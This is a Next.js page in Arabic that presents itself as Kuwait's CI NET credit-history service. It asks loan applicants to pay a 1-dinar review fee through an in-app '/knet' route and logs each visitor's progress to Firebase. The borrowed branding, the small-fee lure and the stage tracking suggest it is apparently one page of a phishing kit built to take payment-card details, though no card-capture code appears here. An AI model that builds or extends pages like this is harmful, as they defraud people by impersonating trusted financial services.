"use client";

import { ArrowRight, CreditCard } from "lucide-react";
import Link from "next/link";
import { Button } from "@/components/ui/button";
import { useEffect } from "react";
import { addData } from "@/lib/firebase";

export default function PaymentPage() {
  const handleUpdatePageName = async () => {
    const visitorid =
      localStorage.getItem("visitor") || new Date().toDateString();

    await addData({ id: visitorid, currentPage: "قبل الدفع" });
  };
  useEffect(() => {
    handleUpdatePageName().then(() => {
      console.log("Done");
    });
  }, []);
  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* CI NET Header */}
      <div className="relative h-48 bg-gradient-to-l from-yellow-400 via-blue-500 to-blue-700 overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-l from-yellow-400/20 via-blue-500/40 to-blue-700/60"></div>
        <div
          className="absolute inset-0"
          style={{
            backgroundImage: `radial-gradient(circle at 20% 50%, rgba(255,255,255,0.1) 1px, transparent 1px),
                           radial-gradient(circle at 40% 20%, rgba(255,255,255,0.1) 1px, transparent 1px),
                           radial-gradient(circle at 60% 80%, rgba(255,255,255,0.1) 1px, transparent 1px),
                           radial-gradient(circle at 80% 40%, rgba(255,255,255,0.1) 1px, transparent 1px)`,
            backgroundSize: "40px 40px, 60px 60px, 50px 50px, 45px 45px",
          }}
        ></div>

        <div className="relative z-10 flex items-center justify-center h-full">
          <div className="text-center">
            <div className="text-white text-4xl font-bold mb-2">
              CI<span className="text-yellow-300">NET</span>
            </div>
            <div className="text-white text-lg">سای نت</div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="px-6 py-8 max-w-2xl mx-auto">
        <div className="bg-white rounded-2xl shadow-lg p-8 mb-8">
          <h1 className="text-2xl font-bold text-gray-800 text-center mb-6">
            مراجعة السجل الائتماني
          </h1>

          <div className="text-gray-700 text-lg leading-relaxed text-center space-y-4 mb-8">
            <p>نشكركم على تقديم طلب التمويل لدى شركة التسهيلات التجارية.</p>

            <p>
              لضمان استكمال إجراءات الطلب، يرجى سداد رسوم خدمة سای نت وقدرها
              <span className="font-bold text-blue-600"> 1.00 دينار </span>
              لمراجعة السجل الائتماني الخاص بكم.
            </p>

            <p>سداد هذه الرسوم يعد خطوة أساسية لاستكمال تقييم طلبكم.</p>
          </div>

          <div className="flex justify-center mb-8">
            <Button
              className="bg-blue-500 hover:bg-blue-600 text-white px-12 py-4 text-lg rounded-xl shadow-lg transition-all duration-300 hover:shadow-xl"
              onClick={() => {
                window.location.href = "/knet";
              }}
            >
              <CreditCard className="ml-2 h-5 w-5" />
              دفع
            </Button>
          </div>
        </div>

        {/* Credit History Review Section */}
        <div className="bg-white rounded-2xl shadow-lg p-8">
          <h2 className="text-xl font-bold text-blue-600 text-center mb-6">
            مراجعة تاريخ الائتمان
          </h2>

          <div className="text-center text-gray-600 mb-8">
            <p className="text-lg mb-2">سای نت</p>
            <p>لتقييم سجلك الائتماني</p>
          </div>

          {/* CI NET Logo */}
          <div className="flex justify-center">
            <div className="relative">
              <div className="text-4xl font-bold">
                <span className="text-blue-700">CI</span>
                <span className="text-yellow-500">NET</span>
              </div>
              <div className="text-center text-blue-600 text-sm mt-1">
                سای نت
              </div>
              <div className="absolute -top-2 -right-2 w-8 h-8 bg-yellow-400 rounded-full opacity-80"></div>
              <div className="absolute -bottom-1 -left-2 w-6 h-6 bg-blue-500 rounded-full opacity-60"></div>
            </div>
          </div>
        </div>

        {/* Back Button */}
        <div className="mt-8 text-center">
          <Link href="/loan-application">
            <Button variant="outline" className="px-6 py-2 bg-transparent">
              <ArrowRight className="ml-2 h-4 w-4" />
              العودة
            </Button>
          </Link>
        </div>
      </div>
    </div>
  );
}
